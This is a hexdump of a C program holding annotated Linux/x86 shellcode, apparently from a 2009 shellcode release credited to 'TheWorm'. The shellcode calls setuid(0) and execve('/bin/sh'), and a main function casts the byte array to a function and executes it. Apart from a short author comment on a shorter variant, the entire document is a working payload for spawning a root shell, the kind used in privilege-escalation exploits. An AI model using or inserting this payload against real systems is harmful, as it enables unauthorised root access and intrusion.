00000000  23 69 6e 63 6c 75 64 65  20 3c 73 74 64 69 6f 2e  |#include <stdio.|
00000010  68 3e 0d 0a 0d 0a 63 6f  6e 73 74 20 63 68 61 72  |h>....const char|
00000020  20 73 68 65 6c 6c 63 6f  64 65 5b 5d 3d 0d 0a 09  | shellcode[]=...|
00000030  22 5c 78 36 61 5c 78 31  37 22 09 09 2f 2f 20 70  |"\x6a\x17"..// p|
00000040  75 73 68 09 24 30 78 31  37 0d 0a 09 22 5c 78 35  |ush.$0x17..."\x5|
00000050  38 22 09 09 09 2f 2f 20  70 6f 70 09 25 65 61 78  |8"...// pop.%eax|
00000060  0d 0a 09 22 5c 78 33 31  5c 78 64 62 22 09 09 2f  |..."\x31\xdb"../|
00000070  2f 20 78 6f 72 09 25 65  62 78 2c 25 65 62 78 0d  |/ xor.%ebx,%ebx.|
00000080  0a 09 22 5c 78 63 64 5c  78 38 30 22 09 09 2f 2f  |.."\xcd\x80"..//|
00000090  20 69 6e 74 09 24 30 78  38 30 0d 0a 0d 0a 09 22  | int.$0x80....."|
000000a0  5c 78 62 30 5c 78 30 62  22 09 09 2f 2f 20 6d 6f  |\xb0\x0b"..// mo|
000000b0  76 09 24 30 78 62 2c 25  61 6c 20 28 53 6f 20 79  |v.$0xb,%al (So y|
000000c0  6f 75 27 6c 6c 20 67 65  74 20 73 65 67 66 61 75  |ou'll get segfau|
000000d0  6c 74 20 20 20 69 66 20  69 74 27 73 20 6e 6f 74  |lt   if it's not|
000000e0  20 61 62 6c 65 0d 0a 74  6f 20 64 6f 20 74 68 65  | able..to do the|
000000f0  20 73 65 74 75 69 64 28  30 29 2e 20 49 66 20 79  | setuid(0). If y|
00000100  6f 75 20 64 6f 6e 27 74  20 77 61 6e 74 20 74 68  |ou don't want th|
00000110  69 73 20 79 6f 75 20 63  61 6e 20 77 72 69 74 65  |is you can write|
00000120  20 22 5c 78 36 61 5c 78  30 62 5c 78 35 38 22 0d  | "\x6a\x0b\x58".|
00000130  0a 69 6e 73 74 65 61 64  20 6f 66 20 22 5c 78 62  |.instead of "\xb|
00000140  30 5c 78 30 62 22 2c 20  62 75 74 20 74 68 65 20  |0\x0b", but the |
00000150  73 68 65 6c 6c 63 6f 64  65 20 77 69 6c 6c 20 62  |shellcode will b|
00000160  65 20 31 20 62 79 74 65  20 6c 6f 6e 67 65 72 0d  |e 1 byte longer.|
00000170  0a 09 22 5c 78 39 39 22  09 09 09 2f 2f 20 63 6c  |.."\x99"...// cl|
00000180  74 64 0d 0a 09 22 5c 78  35 32 22 09 09 09 2f 2f  |td..."\x52"...//|
00000190  20 70 75 73 68 09 25 65  64 78 0d 0a 09 22 5c 78  | push.%edx..."\x|
000001a0  36 38 5c 78 32 66 5c 78  32 66 5c 78 37 33 5c 78  |68\x2f\x2f\x73\x|
000001b0  36 38 22 09 2f 2f 20 70  75 73 68 09 24 30 78 36  |68".// push.$0x6|
000001c0  38 37 33 32 66 32 66 0d  0a 09 22 5c 78 36 38 5c  |8732f2f..."\x68\|
000001d0  78 32 66 5c 78 36 32 5c  78 36 39 5c 78 36 65 22  |x2f\x62\x69\x6e"|
000001e0  09 2f 2f 20 70 75 73 68  09 24 30 78 36 65 36 39  |.// push.$0x6e69|
000001f0  36 32 32 66 0d 0a 09 22  5c 78 38 39 5c 78 65 33  |622f..."\x89\xe3|
00000200  22 09 09 2f 2f 20 6d 6f  76 09 25 65 73 70 2c 25  |"..// mov.%esp,%|
00000210  65 62 78 0d 0a 09 22 5c  78 63 64 5c 78 38 30 22  |ebx..."\xcd\x80"|
00000220  3b 09 09 2f 2f 20 69 6e  74 09 24 30 78 38 30 0d  |;..// int.$0x80.|
00000230  0a 0d 0a 69 6e 74 20 6d  61 69 6e 28 29 0d 0a 7b  |...int main()..{|
00000240  0d 0a 09 70 72 69 6e 74  66 09 28 22 5c 6e 5b 2b  |...printf.("\n[+|
00000250  5d 20 4c 69 6e 75 78 2f  78 38 36 20 73 65 74 75  |] Linux/x86 setu|
00000260  69 64 28 30 29 20 26 20  65 78 65 63 76 65 28 2f  |id(0) & execve(/|
00000270  62 69 6e 2f 73 68 2c 30  29 22 0d 0a 09 09 22 5c  |bin/sh,0)"...."\|
00000280  6e 5b 2b 5d 20 44 61 74  65 3a 20 32 33 2f 30 36  |n[+] Date: 23/06|
00000290  2f 32 30 30 39 22 0d 0a  09 09 22 5c 6e 5b 2b 5d  |/2009"...."\n[+]|
000002a0  20 41 75 74 68 6f 72 3a  20 54 68 65 57 6f 72 6d  | Author: TheWorm|
000002b0  22 0d 0a 09 09 22 5c 6e  5c 6e 5b 2b 5d 20 53 68  |"...."\n\n[+] Sh|
000002c0  65 6c 6c 63 6f 64 65 20  53 69 7a 65 3a 20 25 64  |ellcode Size: %d|
000002d0  20 62 79 74 65 73 5c 6e  5c 6e 22 2c 20 73 69 7a  | bytes\n\n", siz|
000002e0  65 6f 66 28 73 68 65 6c  6c 63 6f 64 65 29 2d 31  |eof(shellcode)-1|
000002f0  29 3b 0d 0a 09 28 2a 28  76 6f 69 64 20 28 2a 29  |);...(*(void (*)|
00000300  28 29 29 20 73 68 65 6c  6c 63 6f 64 65 29 28 29  |()) shellcode)()|
00000310  3b 0d 0a 09 72 65 74 75  72 6e 20 30 3b 0d 0a 7d  |;...return 0;..}|
00000320
